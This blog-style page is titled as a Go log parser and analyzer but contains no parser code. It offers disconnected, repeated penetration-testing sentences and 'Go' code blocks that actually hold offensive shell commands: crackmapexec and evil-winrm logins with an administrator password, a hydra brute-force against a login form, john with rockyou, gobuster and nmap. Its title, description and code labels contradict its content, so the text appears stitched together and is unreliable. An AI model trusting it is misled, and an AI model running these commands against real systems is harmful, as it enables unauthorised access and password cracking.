---
TitleSEO: "Log Parser and Analyzer in Go | ZureFX"
TitlePost: "Log Parser and Analyzer — Go"
Author: "ZureFX"
Description: "A Go script for log parser and analyzer. Built for security research and automation."
Keywords: "scanner, powershell, automation, go, bash, script"
URL: "https://zurefx.github.io/scripting/script-log-parser-and-analyzer-714.html"
URL_IMAGES: ""
Date: "2024-08-25"
Tags: "Scanner, PowerShell, Automation, Go, Bash, Script"
Section: "scripting"
Lang: "en"
main_img: "script-log-parser-and-analyzer-714"
Permalink: "/scripting/script-log-parser-and-analyzer-714.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Lateral movement was facilitated by reusing discovered credentials across services. The scheduled task ran with elevated privileges and could be abused for escalation. Command injection was possible through unsanitized user input in the search functionality.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `bloodhound`
- `bloodhound`
- `nmap`

## Implementation

### Core Logic

The database credentials were hardcoded in the application source code. The service was running without proper input validation, leading to injection vulnerabilities.

```go
crackmapexec smb 10.22.96.176 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.103.31.230 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.78.153.254/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The scheduled task ran with elevated privileges and could be abused for escalation. The backup files contained sensitive information that should not have been accessible.

### Helper Functions

The web application was vulnerable to Server-Side Template Injection (SSTI). Unconstrained delegation was enabled on the compromised machine.

```go
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Usage

### Basic Usage

The kernel version was outdated and vulnerable to a publicly known exploit. The backup files contained sensitive information that should not have been accessible.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.119.13.34 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Advanced Options

The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine.

```bash
crackmapexec smb 10.65.67.9 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p80,636,3268 10.19.223.228 -oN scan.txt
```

## Output

### Example Output

Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible.

```
[+] Scanning target...
[+] Found 20 results
[+] Done in 11.93s
```
